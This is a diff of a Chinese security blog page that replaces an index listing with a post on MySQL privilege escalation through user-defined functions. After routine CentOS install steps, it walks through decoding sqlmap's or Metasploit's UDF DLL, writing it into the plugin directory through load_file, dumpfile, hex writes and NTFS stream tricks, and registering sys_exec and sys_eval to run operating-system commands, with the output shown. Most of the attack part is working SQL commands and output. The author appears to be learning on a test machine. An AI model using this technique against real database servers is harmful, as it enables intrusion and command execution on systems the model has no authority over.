@@ -79,13 +79,26 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="鸡翅儿">
-<meta property="og:url" content="http://wcute.github.io/page/5/index.html">
+<meta name="description" content="Mysql 安装以 Centos 7 为例  wget下载安装包 wget http://repo.mysql.com/mysql57-community-release-el7-10.noarch.rpm   安装软件源 rpm -Uvh mysql57-community-release-el7-10.noarch.rpm    安装 mysql 服务端 yum install  -y  my">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mysql 提权(UDF提权)">
+<meta property="og:url" content="http://wcute.github.io/2019/04/01/Mysql 提权(UDF提权)/index.html">
 <meta property="og:site_name" content="鸡翅儿">
+<meta property="og:description" content="Mysql 安装以 Centos 7 为例  wget下载安装包 wget http://repo.mysql.com/mysql57-community-release-el7-10.noarch.rpm   安装软件源 rpm -Uvh mysql57-community-release-el7-10.noarch.rpm    安装 mysql 服务端 yum install  -y  my">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-f77c0997f4bb2d6f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-073224c063491522.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-5b46e48de12b6894.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-99eee9f0a2bb3c26.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-d4096ef0f84469ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-51452d8d3b0eaf83.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-bdcd9ade85e54f44.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-1ed00c4a5b47f024.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2019-04-01T05:26:19.481Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="鸡翅儿">
+<meta name="twitter:title" content="Mysql 提权(UDF提权)">
+<meta name="twitter:description" content="Mysql 安装以 Centos 7 为例  wget下载安装包 wget http://repo.mysql.com/mysql57-community-release-el7-10.noarch.rpm   安装软件源 rpm -Uvh mysql57-community-release-el7-10.noarch.rpm    安装 mysql 服务端 yum install  -y  my">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/12585049-f77c0997f4bb2d6f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 
 
 
@@ -115,13 +128,13 @@
 
 
 
-  <link rel="canonical" href="http://wcute.github.io/page/5/">
+  <link rel="canonical" href="http://wcute.github.io/2019/04/01/Mysql 提权(UDF提权)/">
 
 
 
 
 
-  <title>鸡翅儿</title>
+  <title>Mysql 提权(UDF提权) | 鸡翅儿</title>
   
 
 
@@ -140,8 +153,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
@@ -266,9 +278,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
 
@@ -281,7 +293,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/XSS漏洞学习/">
+    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2019/04/01/Mysql 提权(UDF提权)/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="wcute">
@@ -298,9 +310,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/12/09/XSS漏洞学习/" itemprop="url">XSS漏洞学习</a></h1>
+          <h1 class="post-title" itemprop="name headline">Mysql 提权(UDF提权)</h1>
         
 
         <div class="post-meta">
@@ -312,8 +322,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T12:33:03+08:00">
-                2018-12-09
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-01T13:27:03+08:00">
+                2019-04-01
               </time>
             
 
@@ -372,27 +382,109 @@
       
 
       
-        
-          
-          XSS漏洞的原理XSS漏洞是发生在目标网站中目标用户的浏览层面上，当用户浏览器渲染整个HTML文档的过程中，出现了不被预期的脚本指令并执行时，XSS就会发生。
-XSS漏洞的危害
-获取用户或者管理员的Cookie
-XSS蠕虫
-钓鱼攻击
-挂马
-键盘记录等
+        <h4 id="Mysql-安装"><a href="#Mysql-安装" class="headerlink" title="Mysql 安装"></a>Mysql 安装</h4><p>以 Centos 7 为例</p>
+<ol>
+<li>wget下载安装包<blockquote>
+<p>wget <a href="http://repo.mysql.com/mysql57-community-release-el7-10.noarch.rpm" target="_blank" rel="noopener">http://repo.mysql.com/mysql57-community-release-el7-10.noarch.rpm</a></p>
+</blockquote>
+</li>
+<li>安装软件源<blockquote>
+<p>rpm -Uvh mysql57-community-release-el7-10.noarch.rpm </p>
+</blockquote>
+</li>
+<li>安装 mysql 服务端<blockquote>
+<p>yum install  -y  mysql-community-server</p>
+</blockquote>
+</li>
+<li>启动mysql<blockquote>
+<p>service mysqld start</p>
+</blockquote>
+</li>
+<li>查看mysql运行状态<blockquote>
+<p>service mysqld status</p>
+</blockquote>
+</li>
+</ol>
+<p>如图，成功启动<br><img src="https://upload-images.jianshu.io/upload_images/12585049-f77c0997f4bb2d6f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
+<ol start="6">
+<li>修改mysql临时密码</li>
+</ol>
+<ul>
+<li>为了加强安全性，MySQL5.7为root用户随机生成了一个密码，在<code>error log</code>中，关于<code>error log</code>的位置，如果安装的是RPM包，则默认是<code>/var/log/mysqld.log</code><blockquote>
+<p>grep ‘temporary password’ /var/log/mysqld.log //启动mysql后查看临时密码</p>
+</blockquote>
+</li>
+</ul>
+<ol start="7">
+<li>登录并修改默认密码<blockquote>
+<p>mysql -u root -p // root 用户登录mysql<br>alter user ‘root‘@’localhost’ IDENTIFIED BY ‘newpassword’;<br>1819报错执行两条语句，修改两个全局参数<br>set global validate_password_policy=0;<br>set global validate_password_length=1;</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-073224c063491522.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<h4 id="MYSQL-利用udf提权"><a href="#MYSQL-利用udf提权" class="headerlink" title="MYSQL 利用udf提权"></a>MYSQL 利用<code>udf</code>提权</h4><h5 id="提权思路："><a href="#提权思路：" class="headerlink" title="提权思路："></a>提权思路：</h5><blockquote>
+<ol>
+<li>将<code>udf</code>文件放到指定位置（<code>mysql版本 &gt; 5.1</code>，<code>udf.dll</code>导出到安装路径<code>MySQL\Lib\Plugin</code>，<code>mysql版本 &lt; 5.1</code> , <code>udf.dll</code>文件在<code>win server 2003</code>下放置于<code>c:\windows\system32</code>目录，在<code>win server 2000</code>下放置在<code>c:\winnt\system32</code>目录）</li>
+<li>从 udf (user defined function) 文件中引入自定义函数(<code>linux</code>环境下导出<code>lib_mysqludf_sys.so</code>，<code>Windows</code>下导出<code>dll</code>文件)</li>
+<li>执行自定义函数</li>
+</ol>
+</blockquote>
+<h5 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h5><ol>
+<li><p>查看 mysql 版本及<code>plugin</code>文件位置</p>
+<blockquote>
+<p>mysql&gt; status<br> 探测到靶机版本5.5 &gt; 5.1，从MySQL 5.0.67开始，文件必须位于plugin目录中。该目录取决于plugin_dir系统变量的值。如果plugin_dir的值为空，则参照5.0.67之前即文件必须位于系统动态链接器的搜索目录中。</p>
+</blockquote>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-5b46e48de12b6894.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
+<blockquote>
+<p>使用<code>select @@plugin_dir</code>全局变量查询<code>plugin</code>文件夹</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-99eee9f0a2bb3c26.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"></p>
+<ol start="2">
+<li>查找 <code>udf.dll</code> 文件<br>SQLMAP 提供了现成的 udf.dll ，位于<code>sqlmap/udf/mysql/windows</code>目录下，由于MySQL位数为32，所以在此选择32位的 dll 文件<br><img src="https://upload-images.jianshu.io/upload_images/12585049-d4096ef0f84469ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"><br>由于sqlmap 中 自带 的shell 以及一些二进制文件，为了防止被误杀都经过异或方式编码，不能直接使用，可以利用sqlmap 自带的解码工具 <code>cloak.py</code>，进入到 <code>sqlmap\extra\cloak\cloak</code> 目录下，执行命令生成 dll 文件：<blockquote>
+<p>cloak.py -d -i E:\sqlmap\sqlmapproject-sqlmap-4cd8590\udf\mysql\windows\32\lib_mysqludf_sys.dll_</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-51452d8d3b0eaf83.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"></p>
+<p>同时MSF也提供了现成的 udf.dll 文件，文件位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll</span><br><span class="line">/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.dll</span><br></pre></td></tr></table></figure></p>
+<ol start="3">
+<li>将<code>udf.dll</code> 文件写入数据库</li>
+</ol>
+<ul>
+<li>方法一：远程加载<br>load_file() 函数支持远程加载，配合 dumpfile 实现写入<br>lib 目录下一定要有 plugin 文件夹 否则报错<br><img src="https://upload-images.jianshu.io/upload_images/12585049-bdcd9ade85e54f44.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"></li>
+</ul>
+<p>使用NTFS ADS流创建 plugin，lib 文件夹，大佬的代码但是我没有成功。。你们可以尝试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select &apos;It is dll&apos; into dumpfile &apos;D:\\phpStudy\\MySQL\\lib::$INDEX_ALLOCATION&apos;;    //使用NTFS ADS流创建lib目录</span><br><span class="line">select &apos;It is dll&apos; into dumpfile &apos;D:\\phpStudy\\MySQL\\lib\\plugin::$INDEX_ALLOCATION&apos;; //利用NTFS ADS再次创建plugin目录</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-1ed00c4a5b47f024.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.png"></p>
+<ul>
+<li>方法二：HEX 写入<br>在某些情况下我们可以将我们 udf.dll 转化成16进制然后写入，这样就不用连接外网了<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select hex(load_file(&apos;E:\\sqlmap\\sqlmapproject-sqlmap-4cd8590\\udf\\mysql\\windows\\32\\lib_mysqludf_sys.dll&apos;)) into outfile &quot;E:\\udf32.hex&quot;;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>生成了 hex 文件以后我们可以将 hex 文件的内容复制出来，写入我们的命令，16进制代码前记得加0x表示16进制<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 0x4D5A9000030000000…(太长省略) into dumpfile &quot;D:\\phpStudy\\MySQL\\lib\\plugin\\udf.dll&quot;;</span><br></pre></td></tr></table></figure></p>
+<p>依旧需要plugin文件存在，这里我手动创建了一个毕竟那个NFTS ADS流创建我没创建成功</p>
+<ol start="4">
+<li>dll 文件利用<br>sqlmap中的 udf 文件提供的函数：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sys_eval，执行任意命令，并将输出返回。</span><br><span class="line">sys_exec，执行任意命令，并将退出码返回。</span><br><span class="line">sys_get，获取一个环境变量。</span><br><span class="line">sys_set，创建或修改一个环境变量。</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>加载函数</p>
+<ul>
+<li><code>sys_exec</code>函数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create function sys_exec RETURNS int soname &apos;udf.dll&apos; ;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from mysql.func where name = &quot;sys_exec&quot;;</span><br><span class="line">+----------+-----+---------+----------+</span><br><span class="line">| name     | ret | dl      | type     |</span><br><span class="line">+----------+-----+---------+----------+</span><br><span class="line">| sys_exec |   2 | udf.dll | function |</span><br><span class="line">+----------+-----+---------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select sys_exec(&apos;whoami&apos;);</span><br><span class="line">+--------------------+</span><br><span class="line">| sys_exec(&apos;whoami&apos;) |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  0 |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.20 sec)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>函数删除<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; drop function sys_exec;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from mysql.func where name = &quot;sys_exec&quot;;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>sys_evel() 函数(该功能将执行系统命令并在屏幕上通过标准输出显示)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create function sys_eval returns string soname &apos;udf.dll&apos;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from mysql.func where name = &quot;sys_eval&quot;;</span><br><span class="line">+----------+-----+---------+----------+</span><br><span class="line">| name     | ret | dl      | type     |</span><br><span class="line">+----------+-----+---------+----------+</span><br><span class="line">| sys_eval |   0 | udf.dll | function |</span><br><span class="line">+----------+-----+---------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select sys_eval(&apos;whoami&apos;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| sys_eval(&apos;whoami&apos;)    |</span><br><span class="line">+-----------------------+</span><br><span class="line">| desktop-jg0a4e7\wcute |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.08 sec)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>函数删除<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; drop function sys_eval;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>sys_get() 函数(该函数返回系统变量的值)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create function sys_get returns string soname &apos;udf.dll&apos;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from mysql.func where name = &quot;sys_get&quot;;</span><br><span class="line">+---------+-----+---------+----------+</span><br><span class="line">| name    | ret | dl      | type     |</span><br><span class="line">+---------+-----+---------+----------+</span><br><span class="line">| sys_get |   0 | udf.dll | function |</span><br><span class="line">+---------+-----+---------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select sys_get(&apos;COMSPEC&apos;);</span><br><span class="line">+-----------------------------+</span><br><span class="line">| sys_get(&apos;COMSPEC&apos;)          |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| C:\Windows\system32\cmd.exe |</span><br><span class="line">+-----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>删除函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop function sys_get;</span><br></pre></td></tr></table></figure></p>
+<p>参考链接：<br><a href="https://www.cnblogs.com/silentdoer/articles/7258232.html" target="_blank" rel="noopener">https://www.cnblogs.com/silentdoer/articles/7258232.html</a><br><a href="http://www.mamicode.com/info-detail-2294087.html" target="_blank" rel="noopener">http://www.mamicode.com/info-detail-2294087.html</a><br><a href="https://www.k0rz3n.com/2018/10/21/Mysql%20%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/10/21/Mysql%20%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/</a><br><a href="https://blog.csdn.net/qq_26090065/article/details/81515355" target="_blank" rel="noopener">https://blog.csdn.net/qq_26090065/article/details/81515355</a></p>
 
-以下是可能嵌入跨源的资源的一些示例：
- 标签嵌
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/12/09/XSS漏洞学习/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
       
     </div>
     
@@ -409,168 +501,28 @@ XSS蠕虫
       
 
       
-
-      
-
       
       
-        <div class="post-eof"></div>
+
       
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/python3-学习（2）/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="wcute">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="鸡翅儿">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/12/09/python3-学习（2）/" itemprop="url">python3-学习（2）</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
             
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T12:33:03+08:00">
-                2018-12-09
-              </time>
+              <a href="/2019/03/29/Nmap 常用命令总结/" rel="next" title="Nmap 常用命令总结">
+                <i class="fa fa-chevron-left"></i> Nmap 常用命令总结
+              </a>
             
+          </div>
 
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
             
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/Python/" itemprop="url" rel="index">
-                    <span itemprop="name">Python</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+          </div>
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
       
-        
-          
-          python类的继承实例：
-
-class people:
-    name=&apos;&apos;
-    age=0
-    __weight=0    #定义私有属性,私有属性在类外部无法直接进行访问
-
-    def __init__(self,n,a,w):
-        self.na
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/12/09/python3-学习（2）/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -580,776 +532,11 @@ class people:
   </article>
 
 
-    
-      
 
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/渗透测试前期---信息搜集/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="wcute">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="鸡翅儿">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/12/09/渗透测试前期---信息搜集/" itemprop="url">渗透测试前期--信息搜集</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T12:33:03+08:00">
-                2018-12-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/Metasploit-渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">Metasploit 渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-          Web 信息搜集
-Web 信息搜集（探测）即 Web 踩点，主要是掌握目标Web服务的方方面面，是实现Web渗透入侵前的准备工作
-Web 踩点内容包括操作系统（linux、windows等）、服务器类型（服务器平台、版本等）、数据库类型（access、sqlsever、mysql、oracle、po
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/12/09/渗透测试前期---信息搜集/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
+    <div class="post-spread">
       
     </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
   </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/Python-3-学习/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="wcute">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="鸡翅儿">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/12/09/Python-3-学习/" itemprop="url">Python-3-学习</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T12:30:03+08:00">
-                2018-12-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/Python/" itemprop="url" rel="index">
-                    <span itemprop="name">Python</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-          注：制表符缩进和空格缩进不能同时使用
-一类 基础语法python2 与 python3 区别输入输出：
-        python2 : raw_input() / input()            print &quot;hello&quot;
-        python3 : input
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/12/09/Python-3-学习/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/渗透测试-靶机Bulldog2/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="wcute">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="鸡翅儿">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/12/09/渗透测试-靶机Bulldog2/" itemprop="url">渗透测试-靶机Bulldog2</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T10:21:25+08:00">
-                2018-12-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/靶机测试/" itemprop="url" rel="index">
-                    <span itemprop="name">靶机测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-          参考链接：https://www.anquanke.com/post/id/160755
-攻击机 ip：192.168.60.230靶机 ip：192.168.30.231
-端口扫描这里仍然使用 nmap
-
-nmap -sV -p- 192.168.60.231
-
-查看到只开放了一个 80端口
-访问
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
